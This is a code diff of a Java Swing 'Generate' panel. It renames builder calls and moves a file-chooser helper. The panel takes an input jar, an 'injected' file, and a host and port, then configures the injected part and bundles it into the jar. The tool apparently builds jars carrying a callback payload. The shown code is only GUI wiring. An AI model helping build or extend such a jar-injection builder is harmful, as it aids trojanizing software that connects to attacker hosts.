@@ -32,7 +32,7 @@ public class Generate extends JPanel {
 
         generateBtn.addActionListener(e -> {
             try {
-                ConfigModifier.modifyCfg(inputFileText.getText(), outputFileText.getText(), hostText.getText(), Integer.parseInt(portText.getText()));
+                ConfigModifier.generate(inputFileText.getText(), outputFileText.getText(), hostText.getText(), Integer.parseInt(portText.getText()));
                 JOptionPane.showMessageDialog(this, "Operation completed");
             } catch (Exception ex) {
                 JOptionPane.showConfirmDialog(this, ex.getMessage(), "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
@@ -41,7 +41,7 @@ public class Generate extends JPanel {
 
         bundleBtn.addActionListener(e -> {
             try {
-                ConfigModifier.combine(inputFileText.getText(), injectedText.getText(), outputFileText.getText());
+                ConfigModifier.bundle(inputFileText.getText(), injectedText.getText(), outputFileText.getText());
                 JOptionPane.showMessageDialog(this, "Operation completed");
             } catch (Exception ex) {
                 JOptionPane.showConfirmDialog(this, ex.getMessage(), "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
@@ -50,8 +50,8 @@ public class Generate extends JPanel {
 
         autoBtn.addActionListener(e -> {
             try {
-                ConfigModifier.modifyCfg(injectedText.getText(), "cache.tmp", hostText.getText(), Integer.parseInt(portText.getText()));
-                ConfigModifier.combine(inputFileText.getText(), "cache.tmp", outputFileText.getText());
+                ConfigModifier.generate(injectedText.getText(), "cache.tmp", hostText.getText(), Integer.parseInt(portText.getText()));
+                ConfigModifier.bundle(inputFileText.getText(), "cache.tmp", outputFileText.getText());
                 Files.deleteIfExists(Path.of("cache.tmp"));
                 JOptionPane.showMessageDialog(this, "Operation completed");
             } catch (Exception ex) {
@@ -94,16 +94,6 @@ public class Generate extends JPanel {
         add(autoBtn, btns);
     }
 
-    private String chooseFile(boolean save) {
-        JFileChooser fileChooser = new JFileChooser(".");
-        fileChooser.setFileFilter(new FileNameExtensionFilter(".jar", "jar"));
-        fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
-        if ((save ? fileChooser.showSaveDialog(this) : fileChooser.showOpenDialog(this)) == JFileChooser.APPROVE_OPTION) {
-            return fileChooser.getSelectedFile().toString();
-        }
-        return "";
-    }
-
     public static JDialog dialog(Frame owner) {
         JDialog dialog = new JDialog(owner, true);
         dialog.setContentPane(new Generate());
@@ -113,5 +103,15 @@ public class Generate extends JPanel {
         dialog.pack();
         dialog.setLocationRelativeTo(null);
         return dialog;
+    }
+
+    private String chooseFile(boolean save) {
+        JFileChooser fileChooser = new JFileChooser(".");
+        fileChooser.setFileFilter(new FileNameExtensionFilter(".jar", "jar"));
+        fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
+        if ((save ? fileChooser.showSaveDialog(this) : fileChooser.showOpenDialog(this)) == JFileChooser.APPROVE_OPTION) {
+            return fileChooser.getSelectedFile().toString();
+        }
+        return "";
     }
 }
